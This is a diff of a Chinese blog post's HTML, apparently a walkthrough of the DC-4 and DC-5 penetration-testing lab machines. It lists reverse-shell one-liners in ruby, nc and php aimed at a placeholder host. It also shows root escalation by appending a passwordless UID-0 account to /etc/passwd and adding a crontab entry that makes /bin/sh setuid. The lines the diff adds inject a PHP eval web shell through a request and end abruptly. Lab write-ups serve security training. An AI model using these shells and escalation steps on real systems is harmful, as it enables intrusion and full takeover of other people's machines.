@@ -64,7 +64,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">3.6k字</span>
+            <span class="post-count">3.8k字</span>
         </span>
     </span>
 
@@ -73,7 +73,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">19分钟</span>
+            <span class="post-count">20分钟</span>
         </span>
     </span>
 </div>
@@ -106,7 +106,7 @@
 <p>2.漏洞利用，CVE-2018-7600 Drupal核心远程代码执行漏洞</p>
 <p>3.提权方式，如suid提权</p>
 <p>4.drupal配置文件和重置管理员密码</p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h2><p>为什么要反弹shell？</p>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a><strong>文件包含漏洞</strong></h2><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h2><p>为什么要反弹shell？</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python: python -c "import pty;pty.spawn('/bin/bash')"</span><br><span class="line">ruby: ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br><span class="line">nc: nc -e /bin/bash ip port</span><br><span class="line">php:&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">sock=fsockopen(<span class="string">"ip"</span>,port);//自己的外网ip，端口任意</span></span><br><span class="line">exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 
@@ -165,6 +165,35 @@
 
 <p><strong>信中给出了charles的密码，切换账户，查看是否有提权的途径，发现teehee命令可以执行root权限</strong></p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> sudo <span class="literal">-l</span></span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> charles on dc<span class="literal">-4</span>:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc<span class="literal">-4</span>:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br><span class="line"></span><br><span class="line">root@dc<span class="literal">-4</span>:/home/jim/backups<span class="comment"># teehee --help #查看teehee的用法</span></span><br><span class="line">Usage: teehee [<span class="type">OPTION</span>]... [<span class="type">FILE</span>]...</span><br><span class="line">Copy standard input to each FILE, and also to standard output.</span><br><span class="line"></span><br><span class="line">  <span class="literal">-a</span>, -<span class="literal">-append</span>              append to the given FILEs, <span class="keyword">do</span> not overwrite</span><br><span class="line">  <span class="literal">-i</span>, -<span class="literal">-ignore</span><span class="literal">-interrupts</span>   ignore interrupt signals</span><br><span class="line">  <span class="literal">-p</span>                        diagnose errors writing to non pipes</span><br><span class="line">      -<span class="literal">-output</span><span class="literal">-error</span>[=<span class="type">MODE</span>]   set behavior on write error.  See MODE below</span><br><span class="line">      -<span class="literal">-help</span>     display this help and <span class="keyword">exit</span></span><br><span class="line">      -<span class="literal">-version</span>  output version information and <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#teehee -a 表示写入文件，但是不会覆盖，所以可以通过写入一个root用户来执行root权限</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> echo <span class="string">"admin::0:0:admin::/bin/bash"</span>|sudo teehee <span class="literal">-a</span> /etc/passwd</span><br><span class="line">admin::<span class="number">0</span>:<span class="number">0</span>:admin::/bin/bash  <span class="comment">##[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]</span></span><br><span class="line">charles@dc<span class="literal">-4</span>:~<span class="variable">$</span> su admin</span><br><span class="line">root@dc<span class="literal">-4</span>:/home/charles<span class="comment"># cd /root</span></span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># ls</span></span><br><span class="line">flag.txt</span><br><span class="line">root@dc<span class="literal">-4</span>:/root<span class="comment"># cat flag.txt </span></span><br><span class="line"></span><br><span class="line"><span class="number">888</span>       <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">8888888</span>b.                             <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">888</span>   o   <span class="number">888</span>          <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  <span class="string">"Y88b                            888 888 888 888 </span></span><br><span class="line"><span class="string">888  d8b  888          888 888      888    888                            888 888 888 888 </span></span><br><span class="line"><span class="string">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span></span><br><span class="line"><span class="string">888d88888b888 d8P  Y8b 888 888      888    888 d88"</span><span class="string">"88b 888 "</span><span class="number">88</span>b d8P  Y8b <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> <span class="number">888</span> </span><br><span class="line"><span class="number">88888</span>P Y88888 <span class="number">88888888</span> <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>    <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">888</span>  <span class="number">888</span> <span class="number">88888888</span> Y8P Y8P Y8P Y8P </span><br><span class="line"><span class="number">8888</span>P   Y8888 Y8b.     <span class="number">888</span> <span class="number">888</span>      <span class="number">888</span>  .d88P Y88..<span class="number">88</span>P <span class="number">888</span>  <span class="number">888</span> Y8b.      <span class="string">"   "</span>   <span class="string">"   "</span>  </span><br><span class="line"><span class="number">888</span>P     Y888  <span class="string">"Y8888  888 888      8888888P"</span>   <span class="string">"Y88P"</span>  <span class="number">888</span>  <span class="number">888</span>  <span class="string">"Y8888  888 888 888 888 </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Congratulations!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#通过teehee的sudo提升权限以 root身份写入crontab计划任务通过执行获取root权限</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cat crontab # 可见文件有格式将授权命令写入该文件授权root bash</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> cat /etc/crontab</span></span><br><span class="line"><span class="string"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="string"># Unlike any other crontab you don't have to run the `crontab'</span></span><br><span class="line"><span class="string"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="string"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="string"># that none of the other crontabs do.</span></span><br><span class="line"><span class="string">SHELL=/bin/sh</span></span><br><span class="line"><span class="string">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo  "</span>* * * * * root chmod <span class="number">4777</span> /bin/sh<span class="string">" | sudo teehee -a /etc/crontab</span></span><br><span class="line"><span class="string">#时间部分全部填写为*，默认这个定时任务每分钟执行一次</span></span><br><span class="line"><span class="string">#通过执行的脚本将 /bin/sh 的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。</span></span><br><span class="line"><span class="string">charles@dc-4:/home/jim<span class="variable">$</span> /bin/sh</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string"># ls /root</span></span><br><span class="line"><span class="string">flag.txt</span></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="DC-5渗透过程"><a href="#DC-5渗透过程" class="headerlink" title="DC-5渗透过程"></a><strong>DC-5渗透过程</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@kali:&#x2F;# dirb http:&#x2F;&#x2F;192.168.126.155&#x2F; -X .php -S</span><br><span class="line">URL_BASE: http:&#x2F;&#x2F;192.168.126.155&#x2F;</span><br><span class="line">WORDLIST_FILES: &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt #默认字典</span><br><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.126.155&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;about-us.php (CODE:200|SIZE:4292)</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;contact.php (CODE:200|SIZE:4282)</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;faq.php (CODE:200|SIZE:5645)</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;footer.php (CODE:200|SIZE:17)  #隐藏路径</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;index.php (CODE:200|SIZE:4025)</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;solutions.php (CODE:200|SIZE:4100) </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.126.155&#x2F;thankyou.php (CODE:200|SIZE:852)  #隐藏路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@kali:&#x2F;# dirb http:&#x2F;&#x2F;192.168.126.155&#x2F; -X .php -S</span><br><span class="line"> GET &#x2F;thankyou.php?&lt;?php eval($_REQUEST[666]); ?&gt;  HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -267,9 +296,9 @@
       </a>
     
     
-      <a href="/2020/07/11/oho/" class="article-nav-link">
+      <a href="/2020/07/11/PHP%E5%AE%89%E5%85%A8/" class="article-nav-link">
         <strong class="article-nav-caption">Older posts</strong>
-        <div class="article-nav-title">oho</div>
+        <div class="article-nav-title">PHP安全</div>
       </a>
     
   </nav>
